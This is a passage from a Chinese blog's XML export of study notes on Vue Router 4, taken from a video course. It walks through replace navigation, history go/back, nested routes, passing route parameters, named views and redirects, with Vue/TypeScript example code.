    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h1><p>采用replace进行页面的跳转，不会在history中保存记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Vue-Router test&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;!-- router-link中使用replace --&gt;</span><br><span class="line">      &lt;router-link replace to=&quot;/&quot;&gt;login&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link replace to=&quot;/reg&quot; style=&quot;margin-left: 10px;&quot;&gt;reg&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">      &lt;button @click=&quot;toPage(&#x27;/&#x27;)&quot;&gt;login&lt;/button&gt;</span><br><span class="line">      &lt;button @click=&quot;toPage(&#x27;/reg&#x27;)&quot;&gt;reg&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">      &lt;button @click=&quot;next&quot;&gt;next&lt;/button&gt;</span><br><span class="line">      &lt;button @click=&quot;prev&quot;&gt;prev&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useRouter &#125; from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">const toPage = (str:string)=&gt; &#123;</span><br><span class="line">  // 编程式导航中使用replace</span><br><span class="line">  router.replace(str)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="go和back"><a href="#go和back" class="headerlink" title="go和back"></a>go和back</h1><p>编程式控制历史记录的前进或后退</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Vue-Router test&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;router-link to=&quot;/&quot;&gt;login&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/reg&quot; style=&quot;margin-left: 10px;&quot;&gt;reg&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">      &lt;button @click=&quot;next&quot;&gt;next&lt;/button&gt;</span><br><span class="line">      &lt;button @click=&quot;prev&quot;&gt;prev&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useRouter &#125; from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">const next = ()=&gt; &#123;</span><br><span class="line">  // 前进n个历史记录</span><br><span class="line">  router.go(1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const prev = ()=&gt; &#123;</span><br><span class="line">  // router.go(-1)</span><br><span class="line">  // 后退一个历史记录</span><br><span class="line">  router.back()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌套路由</title>
    <url>/web/study/Vue-Router/5.%E5%B5%8C%E5%A5%97%E8%B7%AF%E7%94%B1.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>可以将路由进行嵌套使用</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/footer.vue&quot;</span>),</span><br><span class="line">    <span class="comment">// 嵌套路由，可以无限嵌套</span></span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// path为空即默认展示该路由</span></span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;Login&quot;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/login.vue&quot;</span>)</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;reg&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;Reg&quot;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/reg.vue&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>footer.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 这里将展示login或reg --&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h1&gt;我是父路由&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;router-link to=&quot;/&quot;&gt;Login&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/reg&quot; style=&quot;margin-left: 10px;&quot;&gt;Reg&lt;/router-link&gt;</span><br><span class="line">      &lt;!-- 如果父路由不是根路由，比如是/user，则router-link的to必须带上/user --&gt;</span><br><span class="line">      &lt;!-- &lt;router-link to=&quot;/user&quot;&gt;Login&lt;/router-link&gt; --&gt;</span><br><span class="line">      &lt;!-- &lt;router-link to=&quot;/user/reg&quot; style=&quot;margin-left: 10px;&quot;&gt;Reg&lt;/router-link&gt; --&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Vue-Router test&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;!-- 这里将展示footer --&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>路由传参</title>
    <url>/web/study/Vue-Router/4.%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="query方式"><a href="#query方式" class="headerlink" title="query方式"></a>query方式</h1><p>login.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;购物车&lt;/div&gt;</span><br><span class="line">  &lt;table cellspacing=&quot;0&quot; class=&quot;table&quot; border=&quot;1&quot;&gt;</span><br><span class="line">    &lt;thead&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;品名&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;价格&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/thead&gt;</span><br><span class="line">    &lt;tbody&gt;</span><br><span class="line">      &lt;tr :key=&quot;item.id&quot; v-for=&quot;item in data&quot;&gt;</span><br><span class="line">        &lt;th&gt;&#123;&#123; item.name &#125;&#125;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&#123;&#123; item.price &#125;&#125;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&lt;button @click=&quot;toDetail(item)&quot;&gt;详情&lt;/button&gt;&lt;/th&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/tbody&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; data &#125; from &quot;./list.json&quot;</span><br><span class="line">import &#123; useRouter &#125; from &quot;vue-router&quot;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">type Item = &#123;</span><br><span class="line">  name: string</span><br><span class="line">  price: number</span><br><span class="line">  id: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const toDetail = (item:Item)=&gt; &#123;</span><br><span class="line">  // query方式传参</span><br><span class="line">  router.push(&#123;</span><br><span class="line">     path: &quot;/reg&quot;,</span><br><span class="line">    // 参数会被保存在url上，只能接收一个对象</span><br><span class="line">    query: item</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.table &#123;</span><br><span class="line">  width: 400px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>reg.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;详情&lt;/div&gt; &lt;button @click=&quot;router.back&quot;&gt;返回&lt;/button&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- query方式接收参数 --&gt;</span><br><span class="line">    &lt;p&gt;品名：&#123;&#123; route.query.name &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;价格：&#123;&#123; route.query.price &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;id：&#123;&#123; route.query.id &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useRoute, useRouter &#125; from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">const route = useRoute()</span><br><span class="line">const router = useRouter()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="params方式"><a href="#params方式" class="headerlink" title="params方式"></a>params方式</h1><p>login.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;购物车&lt;/div&gt;</span><br><span class="line">  &lt;table cellspacing=&quot;0&quot; class=&quot;table&quot; border=&quot;1&quot;&gt;</span><br><span class="line">    &lt;thead&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;品名&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;价格&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/thead&gt;</span><br><span class="line">    &lt;tbody&gt;</span><br><span class="line">      &lt;tr :key=&quot;item.id&quot; v-for=&quot;item in data&quot;&gt;</span><br><span class="line">        &lt;th&gt;&#123;&#123; item.name &#125;&#125;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&#123;&#123; item.price &#125;&#125;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&lt;button @click=&quot;toDetail(item)&quot;&gt;详情&lt;/button&gt;&lt;/th&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/tbody&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; data &#125; from &quot;./list.json&quot;</span><br><span class="line">import &#123; useRouter &#125; from &quot;vue-router&quot;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">type Item = &#123;</span><br><span class="line">  name: string</span><br><span class="line">  price: number</span><br><span class="line">  id: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const toDetail = (item:Item)=&gt; &#123;</span><br><span class="line">  // params方式传参</span><br><span class="line">  router.push(&#123;</span><br><span class="line">    // 不能使用path，必须使用name</span><br><span class="line">    name: &quot;Reg&quot;,</span><br><span class="line">    // 未定义的params传递</span><br><span class="line">    params: item</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.table &#123;</span><br><span class="line">  width: 400px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>reg.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;详情&lt;/div&gt; &lt;button @click=&quot;router.back&quot;&gt;返回&lt;/button&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- params方式接收参数 --&gt;</span><br><span class="line">    &lt;p&gt;品名：&#123;&#123; route.params.name &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;价格：&#123;&#123; route.params.price &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;id：&#123;&#123; route.params.id &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useRoute, useRouter &#125; from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">const route = useRoute()</span><br><span class="line">const router = useRouter()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>Vue-Router4.1.4移除了未定义的params传递，理由：这种传参方式是路由中的反模式，原因之一是重新加载页面会丢失参数</p>
<p>Vue给出的替代方案：</p>
<ul>
<li>query传参</li>
<li>将参数放在Pinia或VueX仓库里</li>
<li>使用动态路由匹配</li>
<li>传递state，在新页面使用History API接收参数</li>
<li>使用meta原信息方式传递（更适用于路由守卫）</li>
</ul>
<h1 id="动态路由方式"><a href="#动态路由方式" class="headerlink" title="动态路由方式"></a>动态路由方式</h1><p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ......省略</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 带:的路径是动态路由</span></span><br><span class="line">  <span class="attr">path</span>: <span class="string">&quot;/reg/:id&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Reg&quot;</span>,</span><br><span class="line">  <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/reg.vue&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 省略......</span></span><br></pre></td></tr></table></figure>

<p>login.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;购物车&lt;/div&gt;</span><br><span class="line">  &lt;table cellspacing=&quot;0&quot; class=&quot;table&quot; border=&quot;1&quot;&gt;</span><br><span class="line">    &lt;thead&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;品名&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;价格&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/thead&gt;</span><br><span class="line">    &lt;tbody&gt;</span><br><span class="line">      &lt;tr :key=&quot;item.id&quot; v-for=&quot;item in data&quot;&gt;</span><br><span class="line">        &lt;th&gt;&#123;&#123; item.name &#125;&#125;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&#123;&#123; item.price &#125;&#125;&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;&lt;button @click=&quot;toDetail(item)&quot;&gt;详情&lt;/button&gt;&lt;/th&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/tbody&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; data &#125; from &quot;./list.json&quot;</span><br><span class="line">import &#123; useRouter &#125; from &quot;vue-router&quot;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">type Item = &#123;</span><br><span class="line">  name: string</span><br><span class="line">  price: number</span><br><span class="line">  id: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const toDetail = (item:Item)=&gt; &#123;</span><br><span class="line">  // 动态路由方式传参</span><br><span class="line">  router.push(&#123;</span><br><span class="line">    name: &quot;Reg&quot;,</span><br><span class="line">    // 在/router/index.ts定义了动态路由</span><br><span class="line">    params: &#123;</span><br><span class="line">      id: item.id</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.table &#123;</span><br><span class="line">  width: 400px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>reg.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;详情&lt;/div&gt; &lt;button @click=&quot;router.back&quot;&gt;返回&lt;/button&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 动态路由匹配方式接收参数 --&gt;</span><br><span class="line">    &lt;p&gt;品名：&#123;&#123; item?.name &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;价格：&#123;&#123; item?.price &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;id：&#123;&#123; item?.id &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; data &#125; from &quot;./list.json&quot;</span><br><span class="line">import &#123; useRoute, useRouter &#125; from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">const route = useRoute()</span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">// 根据动态路由的参数id，从总数据中获取对应数据</span><br><span class="line">const item = data.find(v=&gt;v.id===Number(route.params.id))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>命名视图</title>
    <url>/web/study/Vue-Router/6.%E5%91%BD%E5%90%8D%E8%A7%86%E5%9B%BE.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>命名视图可以在同一级（同一个组件）中展示更多的路由视图，而不是嵌套显示</p>
<p>命名视图可以让一个组件中具有多个路由渲染出口，这对于一些特定的布局组件非常有用</p>
<p>命名视图的概念类似具名插槽，并且视图的默认名称也是default</p>
<p>一个视图使用一个组件渲染，因此对于同个路由，多个视图就需要多个组件，需要确保正确使用components配置</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/root.vue&quot;</span>),</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/user1&quot;</span>,</span><br><span class="line">        <span class="comment">// 定义多个命名的路由，需要使用components</span></span><br><span class="line">        <span class="attr">components</span>: &#123;</span><br><span class="line">          <span class="comment">// 默认的路由</span></span><br><span class="line">          <span class="attr">bbb</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/B.vue&quot;</span>),</span><br><span class="line">          <span class="attr">default</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/A.vue&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/user2&quot;</span>,</span><br><span class="line">        <span class="comment">// 定义多个命名的路由，需要使用components</span></span><br><span class="line">        <span class="attr">components</span>: &#123;</span><br><span class="line">          <span class="attr">ccc</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/C.vue&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>root.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;router-link to=&quot;user1&quot;&gt;/user1&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link style=&quot;margin-left: 10px;&quot; to=&quot;user2&quot;&gt;/user2&lt;/router-link&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;!-- 什么都不写的话，展示default --&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;router-view name=&quot;bbb&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;router-view name=&quot;ccc&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>重定向和别名</title>
    <url>/web/study/Vue-Router/7.%E9%87%8D%E5%AE%9A%E5%90%91%E5%92%8C%E5%88%AB%E5%90%8D.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><p>使用重定向，在访问某一路由时，跳转到指定的另一路由</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/root.vue&quot;</span>),</span><br><span class="line">    <span class="comment">// 重定向，当访问根路由时，会跳转到/user1</span></span><br><span class="line">    <span class="comment">// 字符串形式</span></span><br><span class="line">    <span class="comment">// redirect: &quot;/user1&quot;,</span></span><br><span class="line">    <span class="comment">// 对象形式</span></span><br><span class="line">    <span class="comment">// redirect: &#123;</span></span><br><span class="line">    <span class="comment">//   path: &quot;/user1&quot;</span></span><br><span class="line">    <span class="comment">// &#125;,</span></span><br><span class="line">    <span class="comment">// 回调函数形式</span></span><br><span class="line">    <span class="attr">redirect</span>: <span class="function"><span class="params">to</span>=&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(to)</span><br><span class="line">      <span class="comment">// 返回需要跳至的路由</span></span><br><span class="line">      <span class="comment">// 返回字符串</span></span><br><span class="line">      <span class="comment">// return &quot;/user&quot;</span></span><br><span class="line">      <span class="comment">// 返回对象，这里还可以带query参数</span></span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/user1&quot;</span>,</span><br><span class="line">        <span class="attr">query</span>: &#123;</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">          <span class="attr">age</span>: <span class="number">24</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/user1&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>: &#123;</span><br><span class="line">          <span class="attr">bbb</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/B.vue&quot;</span>),</span><br><span class="line">          <span class="attr">default</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/A.vue&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/user2&quot;</span>,</span><br><span class="line">        <span class="attr">components</span>: &#123;</span><br><span class="line">          <span class="attr">ccc</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/C.vue&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      